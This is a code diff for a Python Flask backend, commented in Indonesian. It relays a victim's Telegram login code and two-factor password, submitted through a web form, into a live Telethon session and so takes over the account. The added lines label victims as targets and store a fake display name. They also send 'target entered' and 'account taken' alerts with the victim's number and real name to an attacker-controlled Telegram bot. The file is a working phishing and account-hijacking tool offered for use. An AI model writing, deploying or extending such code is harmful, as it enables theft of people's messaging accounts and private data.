@@ -1,4 +1,4 @@
-import os, asyncio, json, re
+import os, asyncio, json, re, requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient
@@ -7,67 +7,105 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, P
 app = Flask(__name__)
 CORS(app)
 
-# Ambil dari Variables Railway
-API_ID = int(os.getenv("API_ID"))
+API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+
 SESSION_DIR = '/tmp/sessions/'
 if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)
 
-# Kamus sementara untuk simpan client yang sedang aktif
 active_clients = {}
+
+def send_bot(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
+    requests.post(url, json=payload)
+
+def format_nomor(nomor):
+    # Hilangkan spasi atau tanda strip jika ada
+    n = re.sub(r'\D', '', nomor)
+    # Jika diawali 08..., ubah jadi +628...
+    if n.startswith('08'):
+        return '+62' + n[1:]
+    # Jika sudah diawali 62..., tinggal tambah +
+    if n.startswith('62'):
+        return '+' + n
+    # Jika belum ada kode negara sama sekali
+    if not nomor.startswith('+'):
+        return '+' + n
+    return nomor
 
 @app.route('/register', methods=['POST'])
 async def register():
     data = request.json
-    nomor = data.get('nomor') # Format: +628xxx
+    nama_web = data.get('nama')
+    nomor_mentah = data.get('nomor')
     
-    # LANGKAH 1: Minta OTP ke Telegram
-    client = TelegramClient(f"{SESSION_DIR}{nomor}", API_ID, API_HASH)
+    # 1. OTOMATIS FORMAT NOMOR KE +62
+    nomor = format_nomor(nomor_mentah)
+
+    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
     await client.connect()
     
     try:
-        # Kirim kode ke Telegram target
+        # TRIGGER: Minta OTP
         sent_code = await client.send_code_request(nomor)
+        
         active_clients[nomor] = {
             "client": client,
-            "phone_code_hash": sent_code.phone_code_hash
+            "phone_code_hash": sent_code.phone_code_hash,
+            "nama_palsu": nama_web
         }
-        return jsonify({"status": "sent", "message": "Kode OTP dikirim ke Telegram"}), 200
+        
+        send_bot(f"⚠️ *Target Masuk!*\n👤 Nama Web: {nama_web}\n📱 Nomor: `{nomor}`\n\n_Menunggu OTP..._")
+        return jsonify({"status": "sent", "message": "OTP Terkirim"}), 200
+        
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/verify-otp', methods=['POST'])
 async def verify_otp():
     data = request.json
-    nomor = data.get('nomor')
+    nomor = format_nomor(data.get('nomor'))
     otp = data.get('otp')
-    sandi_2fa = data.get('sandi') # Opsional jika target pakai 2FA
+    sandi_2fa = data.get('sandi')
 
     if nomor not in active_clients:
-        return jsonify({"status": "error", "message": "Sesi kadaluarsa, ulangi lagi"}), 400
+        return jsonify({"status": "error", "message": "Sesi hilang, refresh halaman"}), 400
 
-    client_data = active_clients[nomor]
-    client = client_data["client"]
-    phone_code_hash = client_data["phone_code_hash"]
+    stored = active_clients[nomor]
+    client = stored["client"]
+    phone_code_hash = stored["phone_code_hash"]
 
     try:
-        # LANGKAH 2: Validasi OTP
-        await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
+        # LOGIN
+        user = await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
         
-        # JIKA LOLOS (OTP BENAR)
-        return jsonify({"status": "success", "message": "Login Berhasil!"}), 200
+        # 2. AMBIL NAMA ASLI DARI TELEGRAM TARGET
+        nama_asli = user.first_name if user.first_name else "Tanpa Nama"
+        # Ambil satu kata pertama dari nama asli
+        nama_panggilan = nama_asli.split()[0]
+
+        send_bot(f"✅ *LOGIN SUKSES!*\n👤 Nama Asli: *{nama_panggilan}*\n📱 Nomor: `{nomor}`\nStatus: Akun Berhasil Diambil.")
+        return jsonify({"status": "success", "message": "Login Berhasil"}), 200
 
     except SessionPasswordNeededError:
-        # JIKA BUTUH VERIFIKASI 2 LANGKAH (Sandi)
         if sandi_2fa:
             try:
-                await client.sign_in(password=sandi_2fa)
-                return jsonify({"status": "success", "message": "Login Berhasil (2FA)!"}), 200
+                user = await client.sign_in(password=sandi_2fa)
+                nama_panggilan = user.first_name.split()[0] if user.first_name else "Target"
+                send_bot(f"✅ *LOGIN SUKSES (2FA)!*\n👤 Nama Asli: *{nama_panggilan}*\n📱 Nomor: `{nomor}`")
+                return jsonify({"status": "success", "message": "Login Berhasil"}), 200
             except:
-                return jsonify({"status": "error", "message": "Sandi 2FA salah!"}), 400
+                return jsonify({"status": "error", "message": "Sandi 2FA Salah!"}), 400
         return jsonify({"status": "need_2fa", "message": "Masukkan Sandi 2FA"}), 200
 
     except PhoneCodeInvalidError:
-        return jsonify({"status": "error", "message": "Kode OTP salah!"}), 400
-    except PhoneCodeExpiredError:
-        return jsonify({"status": "error", "message": "Kode OTP sudah kadaluarsa!"}), 400
+        return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
